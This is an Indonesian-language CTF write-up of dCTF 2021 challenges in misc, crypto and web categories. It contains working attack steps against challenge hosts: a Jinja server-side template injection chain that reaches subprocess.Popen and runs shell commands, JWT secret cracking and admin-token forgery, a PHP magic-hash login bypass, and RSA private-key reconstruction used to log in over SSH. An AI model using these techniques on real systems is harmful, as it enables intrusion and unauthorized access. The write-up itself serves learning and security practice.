---
date: 2021-05-17T20:40:20+07:00
title: "Writeup dCTF 2021"
slug: "writeup-dctf-2021"
tags: [
    "ctf",
    "writeup",
    "crypto",
    "web",
    "misc"
]
description: "Writeup soal yang saya selesaikan pada dCTF 2021."
---

<p align="center">
  <img src="dragonsec_logo_flag.gif" alt="DragonSec Logo" />
</p>

dCTF 2021 diselenggarakan oleh DragonSec SI dimulai dari hari Jum'at jam 15:00 UTC (22:00 WIB) hingga Minggu jam 21:59 UTC (04:49 WIB). Tim saya (Alakadarnya) berhasil menempati posisi ke-41. Berikut ini adalah beberapa _challenge_ yang berhasil saya selesaikan.

----

<details>
<summary>Daftar Isi</summary>

- Misc
    - [Leak Spin](#leak-spin)
    - [Don't Let It Run](#dont-let-it-run)
- Crypto
    - [Julius' ancient script](#julius-ancient-script)
    - [This one is really basic](#this-one-is-really-basic)
    - [Private Encryption Mistake](#private-encryption-mistake)
- Web
    - [Simple Web](#simple-web)
    - [DevOps vs SecOps](#devops-vs-secops)
    - [Secure API](#secure-api)
    - [Very secure website](#very-secure-website)
    - [Injection](#injection)

</details>

## Misc
### Leak Spin
```
We have confident insider report that one of the flags was leaked online. Can you find it?
```

Karena hanya ada deskripsi seperti itu, saya coba mengakses halaman web penyedia CTF (DragonSec), lalu saya menemukan URL Github mereka. Di sana terdapat repo `DCTF1-chall-leak-spin`. Lihat-lihat commitnya, terdapat flagnya di commit `challenge.yml`.

Flag: **dctf{I_L1k3_L1evaAn_P0lkk4}**

### Don't Let It Run
```
PDF documents can contain unusual objects within.
```

Diberikan satu buah file pdf  `dragon.pdf`. Lalu saya coba analisis dengan tool `pdf-parser`, dan ditemukan ada kode javascript di sana.

```bash
pdf-parser dragon.pdf
```
```
<snip>
/S /Javascript
/JS <766172205F3078346163393D5B2736363361435968594B272C273971776147474F272C276C6F67272C273150744366746D272C27313036387552596D7154272C27646374667B7064665F316E6A33637433647D272C273736383537376A6868736272272C2737313733343268417A4F4F51272C27373232353133504158436268272C2738333339383950514B697469272C27313434373836335256636E546F272C2731323533353356746B585547275D3B2866756E6374696F6E285F30783362316636622C5F3078316164386237297B766172205F30783536366565323D5F3078353334373B7768696C652821215B5D297B7472797B766172205F30783237353061353D7061727365496E74285F307835363665653228307831366529292B2D7061727365496E74285F307835363665653228307831366429292B7061727365496E74285F307835363665653228307831366329292B2D7061727365496E74285F307835363665653228307831373329292A2D7061727365496E74285F307835363665653228307831373129292B7061727365496E74285F307835363665653228307831373229292A2D7061727365496E74285F307835363665653228307831366129292B7061727365496E74285F307835363665653228307831366629292A7061727365496E74285F307835363665653228307831373529292B2D7061727365496E74285F307835363665653228307831373029293B6966285F30783237353061353D3D3D5F307831616438623729627265616B3B656C7365205F30783362316636625B2770757368275D285F30783362316636625B277368696674275D2829293B7D6361746368285F3078353736346134297B5F30783362316636625B2770757368275D285F30783362316636625B277368696674275D2829293B7D7D7D285F3078346163392C3078386439376629293B66756E6374696F6E205F30786128297B766172205F30783363366432303D5F3078353334373B636F6E736F6C655B5F3078336336643230283078313734295D285F307833633664323028307831366229293B7D76617220613D27626B706F646E746A636F7073796D6C78656977686F6E7374796B787372707A79272C623D2765787262737071717573746E7A717269756C697A70656565787771736F666D77273B5F30786228612C62293B66756E6374696F6E205F307835333437285F30783337646533352C5F3078313961633236297B5F30783337646533353D5F30783337646533352D30783136613B766172205F30783461633965613D5F3078346163395B5F30783337646533355D3B72657475726E205F30783461633965613B7D66756E6374696F6E205F307862285F30783339623365652C5F3078666165353433297B766172205F30783235393932333D5F30783339623365652B5F30786661653534333B5F30786128293B7D0A>
<snip>
```

Ternyata itu HEX, lalu saya coba decode HEXnya dan dapat flagnya.

Flag: **dctf{pdf_1nj3ct3d}**

## Crypto
### Julius' ancient script
```
I found this Ancient Roman papyrus. Could you decypher it for me?
```

Diberikan satu buah file `flag.txt` yang isinya seperti ini:
```
rq7t{7vH_rFH_vI6_pHH1_qI67}
```
Dilihat dari isinya, saya berasumsi ini adalah sandi geser. Jadi saya mencoba menggesernya menggunakan tools https://cryptii.com/pipes/caesar-cipher dengan alphabet `abcdefghijklmnopqrstuvwxyz0123456789` dan shift sebanyak 14. Didapatkan flagnya:

Flag: **dctf{th3_d13_h4s_b33n_c4st}**

### This one is really basic
```
The answer to life, the universe, and everything.
```

Diberikan satu buah file ```cipher.txt``` yang ketika dibuka terlihat seperti base64 yang cukup... panjang.
```
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUb
GhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWm
FkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1UyMTRVMkpIZHpGV1Z
Fb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMVV5TVRSVk1rcElaSHBHVjFa
RmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWcVFURlNNVlY1V
<snip>
<snip>
<snip>
```

Saya berasumsi ini adalah loop base64 hash, jadi saya membuat script Python untuk looping decrypt:

```python
import base64

f = open("cipher.txt", "r")
cipher = f.read()
f.close()

while True:
    flag = base64.b64decode(cipher).decode()
    cipher = flag
    if "dctf" in flag:
        print(flag)
        break;
```
Lalu jalankan scriptnya
```bash
python3 solver.py
```
```
dctf{Th1s_l00ks_4_lot_sm4ll3r_th4n_1t_d1d}
```

Flag: **dctf{Th1s_l00ks_4_lot_sm4ll3r_th4n_1t_d1d}**

### Private Encryption Mistake
```
What's this? You seem like you have intercepted a part of something you should not have...

ssh user@dctf1-chall-private-encryption-mistake.westeurope.azurecontainer.io port 2222
```

Diberikan satu buah file gambar `blurred.png` seperti ini:

<details>
<summary>blurred.png</summary>

![blurred.png](blurred.png)

</details>

Sepertinya saya harus memulihkan private key-nya supaya dapat masuk ke SSH. Jadi saya coba untuk mengconvert dari gambar ke text menggunakan tools OCR. Namun hasil yang didapatkan tidak sempurna. Ujung-ujungnya saya harus merapihkannya dengan manual. Akhirnya seperti ini:

```
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAupQ7hhy0AQR0LRMZgP/Kl6J3l2+U+wp1YyVB8oDYvslE3AXU
3igwX2LOYgG/JIHQ5UI2G/0Fu5iPPikh3JoUABGFyPwWsBLnohdBBtpvfRLprhbB
lsKwjZfLJIrRex+sSFkcT9zVs1VH4JfcJAbeBNK/aQdMqc1i4JQ1xsQny4ZH7TZe
CXBigK99+V05C+ENRS1uWi9ixgcbMWCCBHsTq0Kl5FIfPvVJVBr075bf7DdARSRU
Wx/FtKVMlWe/nGUTz/ezu2jOx69kd+hvtzX1JVkeY+AFi7Ldta2tNaH/8kitzoXK
JC+6A+LQXynmjQdH9RGsg7QygFjPvIcgwE8LHsMt62OKcIx5LMHlW4lvLK/EZMnr
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
ZEt6WwyEqHhPyP0CggEBAMplAvElBwRTMaT6FfWwi149Q+C1+ogaRc686CkCEs7p
zWjt4+Tg3cndxj/p2Q3Z1AzJH8h/vfZruAQHF/UFwXIAPmuzS1K0HgnNHxr355vs
AYfArpTJeyZoRttQOXvRhM+c887RWGXX278VVS5e5mh16Dn0rKpDcRnsVMahBhTg
+4XheX0zJRa3lOnoWgRLFGcJj9px4Gk7PkZnx24S2bCb7GUbisvtELkLfAvVcGIS
vvJGbeovAGpArRoaCbpnRL96N50zOWGqHeXJFljvNDvfpVAbykf+50d2VApvElQ3
/v7UHVZEfszMk3g1z+RLpgVmtltCsFvDSkDW9omfoJ0CggEBAIBfu08VPrN+B8iD
QpyO2BBUDei8fjdskpvehjWGDqzKNYDxdVcAdERtk6DSWuzpvwPNbTRm6u3v66yu
QkHn9gBlxX1sYe5P9ExqP2p+Au8hR/8s7bhVa8G53WX1Dl47QVSwbKVOWSWtQSwB
hiB9s1YqgAlhcKBWP6vFbavr3VBYY5ln/018rYvR1euDVTUVZdSMmbq3gScF4fhv
NESMd1Je7XjygbVTPJPi1PcT/SgyDRUwz0RPYIvLlA3qT9ae7s5WTp1fanv5MV6p
4LnekTQ/CVjWSorY7xdXTCMfBK1GF7WhVGG4fVSPX8QeIPKUxKkQXgKAFJrCSjj7
CLG5pPkCggEAflfmKUDTC4kfkXwoXzHxHkgialFPbszvzOmyB39q3E2pU5pFTChv
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
[                           Snipped!                           ]
-----END RSA PRIVATE KEY-----
```

Mencari-cari di internet cara solvenya, saya menemukan artikel ini https://blog.cryptohack.org/twitter-secrets.
Jadi saya coba praktikkan untuk membuat solvernya:

```python
import base64
import binascii
from Crypto.Util.number import isPrime
from Crypto.PublicKey import RSA

key = "ZEt6WwyEqHhPyP0CggEBAMplAvElBwRTMaT6FfWwi149Q+C1+ogaRc686CkCEs7pzWjt4+Tg3cndxj/p2Q3Z1AzJH8h/vfZruAQHF/UFwXIAPmuzS1K0HgnNHxr355vsAYfArpTJeyZoRttQOXvRhM+c887RWGXX278VVS5e5mh16Dn0rKpDcRnsVMahBhTg+4XheX0zJRa3lOnoWgRLFGcJj9px4Gk7PkZnx24S2bCb7GUbisvtELkLfAvVcGISvvJGbeovAGpArRoaCbpnRL96N50zOWGqHeXJFljvNDvfpVAbykf+50d2VApvElQ3/v7UHVZEfszMk3g1z+RLpgVmtltCsFvDSkDW9omfoJ0CggEBAIBfu08VPrN+B8iDQpyO2BBUDei8fjdskpvehjWGDqzKNYDxdVcAdERtk6DSWuzpvwPNbTRm6u3v66yuQkHn9gBlxX1sYe5P9ExqP2p+Au8hR/8s7bhVa8G53WX1Dl47QVSwbKVOWSWtQSwBhiB9s1YqgAlhcKBWP6vFbavr3VBYY5ln/018rYvR1euDVTUVZdSMmbq3gScF4fhvNESMd1Je7XjygbVTPJPi1PcT/SgyDRUwz0RPYIvLlA3qT9ae7s5WTp1fanv5MV6p4LnekTQ/CVjWSorY7xdXTCMfBK1GF7WhVGG4fVSPX8QeIPKUxKkQXgKAFJrCSjj7CLG5pPkCggEAflfmKUDTC4kfkXwoXzHxHkgialFPbszvzOmyB39q3E2pU5pFTChv"

a = base64.b64decode(key)
b = binascii.hexlify(a)

# Pecah bagian-bagiannya
data_b = b.split(b'028201')

p_lower_bits = int('0x'+ data_b[0].decode(), 16)
q = int('0x' + data_b[1][4:].decode(), 16)
dp = int('0x' + data_b[2][2:].decode(), 16)
dq_upper_bits = int('0x' + data_b[3][4:].decode(), 16)

e = 65537

p = ''

for kp in range(3, e):
    p_mul = dp * e - 1
    if p_mul % kp == 0:
        p = (p_mul // kp) + 1
        if isPrime(p):
            break;

N = p*q
phi = (p-1)*(q-1)
d = pow(e,-1,phi)

# Private key
key = RSA.construct((N,e,d,p,q))
pem = key.export_key('PEM')

f = open("private.key", "a")
f.write(pem.decode())
f.close()
```

Didapatkan private keynya:
```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Selanjutnya tinggal akses SSH menggunakan private key tadi.
```bash
chmod 600 private.key
ssh -i private.key user@dctf1-chall-private-encryption-mistake.westeurope.azurecontainer.io -p 2222
```
```
Welcome to OpenSSH Server

dctf{Y0u_Are_N0w_Br34thing_M4nua11y}
```

Flag: **dctf{Y0u_Are_N0w_Br34thing_M4nua11y}**

## Web
### Simple Web
```
Time to warm up!
http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080
```

Saya membuka link yang diberikan, melihat-lihat source code terdapat input hidden. Lalu saya ganti valuenya menjadi "1" melalui inspect element.
![Inspect Element](SimpleWeb.png)
Lalu submit dan dapat flagnya.

Flag: **dctf{w3b_c4n_b3_fun_r1ght?}**

### DevOps vs SecOps
```
Automatization is amazing when it works, but it all comes at a cost... You have to be careful...

(URL not missing)
```

Setelah berlama-lama memikirkan apa maksud chall ini, saya jadi teringat halaman Github DragonSec ada repo DevOps. Jadi saya buka kembali halaman Github mereka. Setelah itu masuk ke branch `devops` dan lihat `Github Actions`. Dapat flagnya.

Flag: **dctf{H3ll0_fr0m_1T_guy}**

### Secure API
```
Frontend is overrated! API rocks!
http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
```

Mencoba mengakses url tersebut dengan Insomnia API Client, ternyata disuruh login. Karna tidak diberitahu endpoint untuk login, saya menebak-nebak. Ternyata di `/login`. Jadi langsung saja login sebagai guest. `guest:guest`. Berhasil login, didapatkan JWT token.

```json
{
  "Token": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMjY5MzI1fQ.O2PXSYlyd9XlrMomFsSEL_h5zkv9Fhhei4EcHxYWL3_vP7wtoxSsZp3cS1IT5WEyPJuciyAcWUZDM-4CH5LuKw"
}
```

Kembali lagi ke endpoint `/` dengan token guest. Didapatkan respon:

```json
{
  "Message": "Hi, guest! You are not admin, I have no secret for you."
}
```

Hmmm... Berarti saya harus login sebagai admin. Saya coba periksa di https://jwt.io token tersebut. Didapatkan informasi algoritma `HS512` dengan payload:
```
{
  "username": "guest",
  "exp": 1621269325
}
```

Saya mencoba menggunakan John The Ripper untuk mendapatkan secret supaya dapat mengubah payloadnya.
```bash
john token --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA512
```

Didapatkan secretnya adalah `147852369`. Lalu saya coba ubah payloadnya melalui https://jwt.io dengan mengganti username menjadi 'admin'.

Saya coba lagi ke API Client, dan didapatkan respon:
```
{
  "Message": "Hi, admin! I have a secret for you.",
  "Secret": "dctf{w34k_k3y5_4r3_n0t_0k4y}"
}
```

Flag:  **dctf{w34k_k3y5_4r3_n0t_0k4y}**

## Very secure website
```
Some students have built their most secure website ever. Can you spot their mistake?

http://dctf1-chall-very-secure-site.westeurope.azurecontainer.io/
```

Setelah saya mengakses url yang diberikan, terdapat url lagi yang menyertakan source code. Source codenya seperti ini:

```php
 <?php
    if (isset($_GET['username']) and isset($_GET['password'])) {
        if (hash("tiger128,4", $_GET['username']) != "51c3f5f5d8a8830bc5d8b7ebcb5717df") {
            echo "Invalid username";
        }
        else if (hash("tiger128,4", $_GET['password']) == "0e132798983807237937411964085731") {
            $flag = fopen("flag.txt", "r") or die("Cannot open file");
            echo fread($flag, filesize("flag.txt"));
            fclose($flag);
        }
        else {
            echo "Try harder";
        }
    }
    else {
        echo "Invalid parameters";
    }
?> 
```

Saya coba bruteforce, didapatkan usernamenya adalah 'admin'. Untuk password, ini ada yang unik.
Bisa dilihat awalan untuk password adalah '0e132...' dimana ini adalah `Magic Hashes`. Untuk itu, cari plain text yang jika dihash menghasilkan mirip-mirip seperti itu. Untuk baca-baca lebih lanjut tentang Magic Hashes, bisa dibaca di sini https://www.whitehatsec.com/blog/magic-hashes/

Dalam hal ini, saya mencoba '479763000' untuk password, karena akan menghasilkan '00e05651056780370631793326323796'. Lalu saya mencoba login kembali.

Dan dapat flagnya.

Flag: **dctf{It's_magic._I_ain't_gotta_explain_shit.}**

## Injection
```
Our local pharmacy exposed admin login to the public, can you exploit it?
http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/
```

Saya langsung mengakses url tersebut, dan muncul halaman login. Anehnya sewaktu login, diarahkan ke halaman 404.
![Page 404](Injection.png)
Saya menduga ini template injection. Jadi, saya masukkan payload `{{ config }}` lalu...
![Config Payload](Injection2.png)

Ternyata memang benar template injection. Langsung saja saya ulik-ulik pakai payload lain. Mencoba payload `{{ config.items() }}` saya menemukan ini:
```
('WCONTINUED', 8), ('WCOREDUMP', <built-in function WCOREDUMP>), ('WEXITED', 4), ('WEXITSTATUS', <built-in function WEXITSTATUS>), ('WIFCONTINUED', <built-in function WIFCONTINUED>), ('WIFEXITED', <built-in function WIFEXITED>), ('WIFSIGNALED', <built-in function WIFSIGNALED>), ('WIFSTOPPED', <built-in function WIFSTOPPED>), ('WNOHANG', 1), ('WNOWAIT', 16777216), ('WSTOPPED', 2), ('WSTOPSIG', <built-in function WSTOPSIG>), ('WTERMSIG', <built-in function WTERMSIG>), ('WUNTRACED', 2), ('W_OK', 2), ('X_OK', 1)]) doesn't exist :(
```
Yak, ternyata SSTI Vuln. Langsung saja dieksploit. Saya memasukkan payload `{{ ''.__class__.__mro__ }}`. Dapat respon:
```
Oops! Page login(<class 'str'>, <class 'object'>) doesn't exist :(
```
Saya coba masuk ke subclassnya. `{{ ''.__class__.__mro__[1].__subclasses__() }}`. Dan beruntungnya saya, di sana terdapat kelas `subprocess.Popen`. Saya bisa exec shell nih 😁. Langsung saja saya mengakses subclass tersebut yang terdapat di index 414 dengan payload `{{''.__class__.__mro__[1].__subclasses__()[414]}}`. Didapatkan respon:

```
Oops! Page login<class 'subprocess.Popen'> doesn't exist :(
```

Yak, sekarang saya sudah bisa melakukan shell exec di sini. Jadi langsung saja masukkan payload `{{ ''.__class__.__mro__[1].__subclasses__()[414]('ls',shell=TRUE,stdout=-1).communicate()}}`. Didapatkan respon:

```
Oops! Page login(b'app.py\nlib\nstatic\ntemplates\n', None) doesn't exist :(
```

Terdapat tiga direktori di sana, yaitu lib, static, dan templates. Mari kita lihat direktori lib. Dengan memasukkan payload `{{ ''.__class__.__mro__[1].__subclasses__()[414](['ls', 'lib'],shell=TRUE,stdout=-1).communicate()}}`. Didapatkan respon:
```
Oops! Page login(b'security.py\n', None) doesn't exist :(
```

Terdapat file `security.py`. Langsung saja saya liat isinya dengan payload `{{ ''.__class__.__mro__[1].__subclasses__()[414](['cat', 'lib/security.py'],shell=TRUE,stdout=-1).communicate()}}`. Didapatkan respon:
```
Oops! Page login(b"import base64\n\n\ndef validate_login(username, password):\n if username != 'admin':\n return False\n \n valid_password = 'QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ'\n return base64.b64encode(password.encode('ascii')).decode('ascii')[::-1].lstrip('=') == valid_password\n\n", None) doesn't exist :(
```

Di variabel valid_password terdapat string base64 yang direverse. Jadi saya coba decode saja base64nya.

![Koki Siber](Injection3.png)

Flag: **dctf{4ll_us3r_1nput_1s_3v1l}**


#### Penutup
Itulah beberapa _challenge_ yang berhasil saya kerjakan. Untuk _challenge_ lainnya dikerjakan oleh anggota tim saya. Mereka juga menerbitkan writeup seperti ini.

Silakan mampir dulu ke web mereka untuk baca-baca:

- [ud1nsan](https://wisnuazfar.site/)
- [Vaints](https://vaints-blog.web.app/)

Terima kasih sudah mampir 😁
